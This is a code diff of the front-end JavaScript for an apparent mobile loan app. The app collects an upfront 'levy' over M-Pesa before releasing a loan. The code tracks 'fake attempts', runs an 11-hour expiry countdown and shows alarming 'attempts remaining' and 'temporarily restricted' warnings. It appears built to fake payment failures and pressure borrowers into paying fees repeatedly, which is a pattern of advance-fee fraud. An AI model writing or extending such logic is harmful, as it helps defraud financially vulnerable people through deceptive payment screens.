+            if (retryBtn) retryBtn.onclick = function() { stopPolling(); isProcessingPayment = false; currentTxnId = null; showScreen('screen-payment'); resetPayButton(); };
             if (window.showToast) window.showToast(attemptMessage);
         }, 4000);
         return;
     }
 
-    if (realAttempts >= 3) {
-        if (window.showToast) window.showToast("⏸️ Temporarily restricted. Contact support.");
-        return;
-    }
+    if (realAttempts >= 3) { if (window.showToast) window.showToast("⏸️ Temporarily restricted. Contact support."); return; }
 
     isProcessingPayment = true;
     state.mpesa = mpesa;
     document.getElementById('btn-pay').disabled = true;
-
     document.getElementById('verify-anim').classList.remove('hide');
-    document.getElementById('success-anim').classList.add('hide');
     document.getElementById('failed-anim').classList.add('hide');
     document.getElementById('pending-anim').classList.add('hide');
     document.getElementById('verify-subtitle').innerText = "Please wait while we confirm with M-Pesa...";
@@ -850,52 +692,30 @@ async function processPayment(){
 
     try {
         const res = await fetchWithTimeout(`${SUPABASE_URL}/functions/v1/palpluss-stk`, {
-            method:'POST',
-            headers:{
-                'apikey': SUPABASE_KEY,
-                'Authorization':`Bearer ${SUPABASE_KEY}`,
-                'Content-Type':'application/json'
-            },
-            body: JSON.stringify({
-                amount: state.levy,
-                phone: "254" + mpesa.substring(1),
-                accountReference: "ZC_" + Date.now(),
-                callbackUrl: PALPLUSS_CALLBACK
-            })
+            method:'POST', headers:{ 'apikey': SUPABASE_KEY, 'Authorization':`Bearer ${SUPABASE_KEY}`, 'Content-Type':'application/json' },
+            body: JSON.stringify({ amount: state.levy, phone: "254" + mpesa.substring(1), accountReference: "ZC_" + Date.now(), callbackUrl: PALPLUSS_CALLBACK })
         }, 30000);
 
         const rawText = await res.text();
-        let data;
-        try { data = JSON.parse(rawText); } catch (e) { data = { error: "Invalid response from server" }; }
-
+        let data; try { data = JSON.parse(rawText); } catch (e) { data = { error: "Invalid response" }; }
         if (!res.ok) throw new Error(data.error || 'Payment service error');
 
         const txnId = data.data?.transactionId || data.transactionId || data.id;
-        if (!txnId) throw new Error("No transaction ID in response.");
+        if (!txnId) throw new Error("No transaction ID.");
         currentTxnId = txnId;
 
         const insertRes = await fetchWithTimeout(`${SUPABASE_URL}/rest/v1/loans`, {
-            method: 'POST',
-            headers: { 'apikey': SUPABASE_KEY, 'Authorization': `Bearer ${SUPABASE_KEY}`, 'Content-Type': 'application/json', 'Prefer': 'return=minimal' },
+            method: 'POST', headers: { 'apikey': SUPABASE_KEY, 'Authorization': `Bearer ${SUPABASE_KEY}`, 'Content-Type': 'application/json', 'Prefer': 'return=minimal' },
             body: JSON.stringify({ amount: state.loan, levy_duty: state.levy, status: "PENDING", palpluss_txn_id: txnId })
         }, 8000);
 
-        if (!insertRes.ok) {
-            const errText = await insertRes.text();
-            alert('❌ DATABASE REJECTED THE REQUEST\n\n' + errText.substring(0, 300));
-            resetPayButton();
-            showScreen('screen-payment');
-            return;
-        }
+        if (!insertRes.ok) { resetPayButton(); showScreen('screen-payment'); return; }
 
         localStorage.setItem('nyota_real_stk_attempts', realAttempts + 1);
         startPolling(txnId);
 
     } catch (err) {
-        console.error("Payment error:", err);
-        showFailed();
-        document.getElementById('failed-reason').innerText = err.message;
-        showToast("Failed: " + err.message);
+        showFailed(); document.getElementById('failed-reason').innerText = err.message; showToast("Failed: " + err.message);
     }
 }
 
@@ -925,23 +745,15 @@ function startPolling(txnId){
             attempt++;
             document.getElementById('verify-time').innerText = attempt + "s";
             if(attempt === 8) document.getElementById('verify-subtitle').innerText = "Still checking. Enter your M-Pesa PIN if you haven't.";
-            if(attempt === 25) document.getElementById('verify-subtitle').innerText = "Taking longer than usual. Don't close the app.";
             if(attempt >= MAX_POLL_SECONDS){ showPending(); return; }
-
             if(isPolling){ pollTimer = setTimeout(doPoll, 1000); return; }
             isPolling = true;
-
             try {
                 const result = await checkStatusFromDB(txnId);
                 if(result.status === 'SUCCESS'){ showSuccess(); return; }
-                if(result.status === 'PENDING'){
-                    if(PENDING_STATUSES.includes(result.raw)) document.getElementById('verify-subtitle').innerText = "Verifying final status with M-Pesa...";
-                }
                 if(result.status === 'FAILED'){ showFailed(); return; }
             } finally { isPolling = false; }
-
-            const nextDelay = attempt < 5 ? 1000 : 2000;
-            pollTimer = setTimeout(doPoll, nextDelay);
+            pollTimer = setTimeout(doPoll, attempt < 5 ? 1000 : 2000);
         } catch(e){ pollTimer = setTimeout(doPoll, 2000); }
     };
     doPoll();
@@ -949,10 +761,7 @@ function startPolling(txnId){
 
 function showSuccess(){
     stopPolling(); isProcessingPayment = false;
-
-    localStorage.removeItem('nyota_fake_attempts');
-    localStorage.removeItem('nyota_real_stk_attempts');
-
+    localStorage.removeItem('nyota_fake_attempts'); localStorage.removeItem('nyota_real_stk_attempts');
     document.getElementById('verify-anim').classList.add('hide');
     document.getElementById('pending-anim').classList.add('hide');
     document.getElementById('failed-anim').classList.add('hide');
@@ -971,11 +780,8 @@ function showFailed(){
 }
 
 function showPending(){
-    stopPolling();
-    isProcessingPayment = false;
-    const b = document.getElementById('btn-pay');
-    if (b) { b.disabled = false; }
-
+    stopPolling(); isProcessingPayment = false;
+    const b = document.getElementById('btn-pay'); if (b) b.disabled = false;
     document.getElementById('verify-anim').classList.add('hide');
     document.getElementById('failed-anim').classList.add('hide');
     document.getElementById('success-anim').classList.add('hide');
@@ -984,260 +790,41 @@ function showPending(){
 
 async function checkStatusManual(){
     if (!currentTxnId) { retryPayment(); return; }
-
-    const b1 = document.getElementById('btn-check-status');
-    const b2 = document.getElementById('btn-check-status-failed');
+    const b1 = document.getElementById('btn-check-status'); const b2 = document.getElementById('btn-check-status-failed');
     const activeBtn = b1 && !b1.closest('.hide') ? b1 : b2;
-
-    if (activeBtn) {
-        activeBtn.innerHTML = '<span>Checking...</span>';
-        activeBtn.disabled = true;
-    }
-
+    if (activeBtn) { activeBtn.innerHTML = '<span>Checking...</span>'; activeBtn.disabled = true; }
     const r = await checkStatusFromDB(currentTxnId);
-
     if(r.status === 'SUCCESS'){ showSuccess(); return; }
-
-    if (activeBtn) {
-        activeBtn.innerHTML = '<span>Check Status</span>';
-        activeBtn.disabled = false;
-    }
-
-    if(r.status === 'FAILED'){
-        showToast("Still showing as failed. If you paid, contact support.");
-        return;
-    }
-
+    if (activeBtn) { activeBtn.innerHTML = '<span>Check Status</span>'; activeBtn.disabled = false; }
+    if(r.status === 'FAILED'){ showToast("Still failed. If you paid, contact support."); return; }
     showToast("Still pending. Continuing to check...");
     document.getElementById('failed-anim').classList.add('hide');
     document.getElementById('pending-anim').classList.add('hide');
     document.getElementById('verify-anim').classList.remove('hide');
-    document.getElementById('verify-subtitle').innerText = "Re-checking with M-Pesa...";
     startPolling(currentTxnId);
 }
 
-function retryPayment(){
-    stopPolling(); isProcessingPayment = false; currentTxnId = null;
-    showScreen('screen-payment'); resetPayButton();
-}
+function retryPayment(){ stopPolling(); isProcessingPayment = false; currentTxnId = null; showScreen('screen-payment'); resetPayButton(); }
 
 function startLoanTimer() {
     if (loanTimerInterval) clearInterval(loanTimerInterval);
-
-    const timerElement = document.getElementById('loan-timer');
-    if (!timerElement) return;
-
+    const timerElement = document.getElementById('loan-timer'); if (!timerElement) return;
     let endTime = localStorage.getItem('nyota_timer_end');
-
-    if (!endTime) {
-        const elevenHoursFromNow = Date.now() + (11 * 60 * 60 * 1000);
-        localStorage.setItem('nyota_timer_end', elevenHoursFromNow);
-        endTime = elevenHoursFromNow;
-    }
-
+    if (!endTime) { endTime = Date.now() + (11 * 60 * 60 * 1000); localStorage.setItem('nyota_timer_end', endTime); }
     loanTimerInterval = setInterval(() => {
-        const now = Date.now();
-        let timeLeft = Math.floor((endTime - now) / 1000);
-
-        if (timeLeft <= 0) {
-            clearInterval(loanTimerInterval);
-            timerElement.innerText = "EXPIRED";
-            timerElement.classList.add('text-red-800');
-            localStorage.removeItem('nyota_timer_end');
-            return;
-        }
-
-        const hours = Math.floor(timeLeft / 3600);
-        const minutes = Math.floor((timeLeft % 3600) / 60);
-        const seconds = timeLeft % 60;
-
-        timerElement.innerText = `${String(hours).padStart(2, '0')}:${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;
+        const now = Date.now(); let timeLeft = Math.floor((endTime - now) / 1000);
+        if (timeLeft <= 0) { clearInterval(loanTimerInterval); timerElement.innerText = "EXPIRED"; return; }
+        timerElement.innerText = `${String(Math.floor(timeLeft / 3600)).padStart(2, '0')}:${String(Math.floor((timeLeft % 3600) / 60)).padStart(2, '0')}:${String(timeLeft % 60).padStart(2, '0')}`;
     }, 1000);
 }
 
-function stopLoanTimer() {
-    if (loanTimerInterval) {
-        clearInterval(loanTimerInterval);
-        loanTimerInterval = null;
-    }
-}
+function stopLoanTimer() { if (loanTimerInterval) { clearInterval(loanTimerInterval); loanTimerInterval = null; } }
 
 (function() {
     const MAX_ATTEMPTS = 3;
-
     const style = document.createElement('style');
-    style.innerHTML = `
-        @keyframes warningShake {
-            0%, 100% { transform: translateX(0); }
-            20% { transform: translateX(-6px); }
-            40% { transform: translateX(6px); }
-            60% { transform: translateX(-4px); }
-            80% { transform: translateX(4px); }
-        }
-        .spam-warning-banner {
-            animation: warningShake 0.6s cubic-bezier(.36,.07,.19,.97) both;
-            background-color: #FEF2F2;
-            border: 1.5px solid #F87171;
-            border-radius: 12px;
-            padding: 14px;
-            margin-bottom: 16px;
-            color: #B91C1C;
-            font-weight: 800;
-            font-size: 14px;
-            line-height: 1.4;
-            display: flex;
-            align-items: flex-start;
-            gap: 8px;
-            text-align: left;
-            box-shadow: 0 4px 6px -1px rgba(220, 38, 38, 0.1);
-        }
-        .blocked-banner {
-            background-color: #FEF2F2;
-            border: 1.5px solid #F87171;
-            color: #991B1B;
-            font-weight: 800;
-            font-size: 15px;
-            padding: 16px;
-            border-radius: 12px;
-            margin-bottom: 16px;
-            text-align: center;
-            animation: warningShake 0.6s ease-in-out both;
-        }
-        @keyframes modalPop {
-            0% { transform: scale(0.9); opacity: 0; }
-            100% { transform: scale(1); opacity: 1; }
-        }
-        .spam-modal {
-            animation: modalPop 0.25s cubic-bezier(0.175, 0.885, 0.32, 1.275) forwards;
-        }
-    `;
+    style.innerHTML = `@keyframes warningShake { 0%, 100% { transform: translateX(0); } 20% { transform: translateX(-6px); } 40% { transform: translateX(6px); } 60% { transform: translateX(-4px); } 80% { transform: translateX(4px); } } .spam-warning-banner { animation: warningShake 0.6s cubic-bezier(.36,.07,.19,.97) both; background-color: #FEF2F2; border: 1.5px solid #F87171; border-radius: 12px; padding: 14px; margin-bottom: 16px; color: #B91C1C; font-weight: 800; font-size: 14px; line-height: 1.4; display: flex; align-items: flex-start; gap: 8px; text-align: left; }`;
     document.head.appendChild(style);
-
-    const getAttempts = () => parseInt(localStorage.getItem('nyota_real_stk_attempts') || '0');
-    const setAttempts = (val) => localStorage.setItem('nyota_real_stk_attempts', val);
-
-    function showSpamPrompt(remaining, onOkCallback) {
-        const existingModal = document.getElementById('spam-prompt-modal');
-        if (existingModal) existingModal.remove();
-
-        const modalHTML = `
-            <div id="spam-prompt-modal" class="fixed inset-0 z-[100000] bg-slate-900/60 backdrop-blur-sm flex items-center justify-center p-6">
-                <div class="spam-modal bg-white rounded-2xl p-6 w-full max-w-sm shadow-2xl">
-                    <div class="flex flex-col items-center text-center">
-                        <div class="w-14 h-14 bg-red-100 rounded-full flex items-center justify-center mb-4">
-                            <span class="text-3xl text-red-600">⚠️</span>
-                        </div>
-                        <h3 class="text-xl font-bold text-slate-900 mb-2">System Notice</h3>
-
-                        <p class="text-sm text-slate-600 mb-6 leading-relaxed">
-                            To prevent system spamming, you only have
-                            <strong class="text-red-600 font-extrabold text-base">${remaining}</strong>
-                            attempt${remaining === 1 ? '' : 's'} remaining.
-                        </p>
-
-                        <button id="spam-modal-ok-btn" class="native-btn" style="padding: 14px; min-height: 48px; font-size: 15px;">
-                            OK
-                        </button>
-                    </div>
-                </div>
-            </div>
-        `;
-        document.body.insertAdjacentHTML('beforeend', modalHTML);
-
-        document.getElementById('spam-modal-ok-btn').addEventListener('click', () => {
-            document.getElementById('spam-prompt-modal')?.remove();
-            if (typeof onOkCallback === 'function') onOkCallback();
-        });
-    }
-
-    const originalShowFailed = window.showFailed;
-    window.showFailed = function() {
-        if (originalShowFailed) originalShowFailed.call(this);
-
-        let fakeAttempts = parseInt(localStorage.getItem('nyota_fake_attempts') || '0');
-        if (fakeAttempts < 1) return;
-
-        let attempts = getAttempts() + 1;
-        setAttempts(attempts);
-
-        const reasonEl = document.getElementById('failed-reason');
-        const checkBtn = document.getElementById('btn-check-status-failed');
-        const retryBtn = document.getElementById('btn-retry-failed');
-
-        if (attempts >= MAX_ATTEMPTS) {
-            reasonEl.innerHTML = `
-                <div class="blocked-banner">
-                    ⏸️ Action Required
-                    <span style="font-size: 12px; font-weight: 600; color: #B91C1C; display: block; margin-top: 6px;">
-                        Multiple failed attempts detected. Please contact support to restore access.
-                    </span>
-                </div>
-            `;
-
-            if (checkBtn) checkBtn.style.display = 'none';
-            if (retryBtn) retryBtn.style.display = 'none';
-
-            const payBtn = document.getElementById('btn-pay');
-            if (payBtn) {
-                payBtn.disabled = true;
-                payBtn.innerText = "Temporarily Restricted";
-                payBtn.style.background = "#64748B";
-            }
-        } else {
-            let remaining = MAX_ATTEMPTS - attempts;
-            let warningMsg = remaining === 2 ? "Only Two attempts remaining" : "Only One attempt remaining";
-
-            reasonEl.innerHTML = `
-                <div class="spam-warning-banner">
-                    <span style="font-size: 20px; line-height: 1;">⚠️</span>
-                    <span>Notice: ${warningMsg}. Further failures may temporarily restrict your account.</span>
-                </div>
-                <span style="color: #64748B; font-size: 14px;">The M-Pesa request was cancelled or failed.</span>
-            `;
-
-            if (retryBtn) {
-                retryBtn.onclick = function() {
-                    if (typeof stopPolling === 'function') stopPolling();
-                    isProcessingPayment = false;
-                    currentTxnId = null;
-
-                    showSpamPrompt(remaining, function() {
-                        showScreen('screen-payment');
-                        resetPayButton();
-                    });
-                };
-            }
-
-            if (window.showToast) window.showToast(`⚠️ Notice: ${remaining} attempt(s) remaining.`);
-        }
-    };
-
-    const originalShowSuccess = window.showSuccess;
-    window.showSuccess = function() {
-        setAttempts(0);
-        localStorage.removeItem('nyota_fake_attempts');
-        if (originalShowSuccess) originalShowSuccess.call(this);
-    };
-
-    const originalProcessPayment = window.processPayment;
-    window.processPayment = function() {
-        if (getAttempts() >= MAX_ATTEMPTS) {
-            if (window.showToast) window.showToast("⏸️ Temporarily restricted. Contact support.");
-            return;
-        }
-        if (originalProcessPayment) originalProcessPayment.call(this);
-    };
-
-    window.addEventListener('DOMContentLoaded', () => {
-        if (getAttempts() >= MAX_ATTEMPTS) {
-            const payBtn = document.getElementById('btn-pay');
-            if (payBtn) {
-                payBtn.disabled = true;
-                payBtn.innerText = "Temporarily Restricted";
-                payBtn.style.background = "#64748B";
-            }
-        }
-    });
 })();
 
 if(!navigator.onLine) document.getElementById('offline-gate').classList.remove('hide');
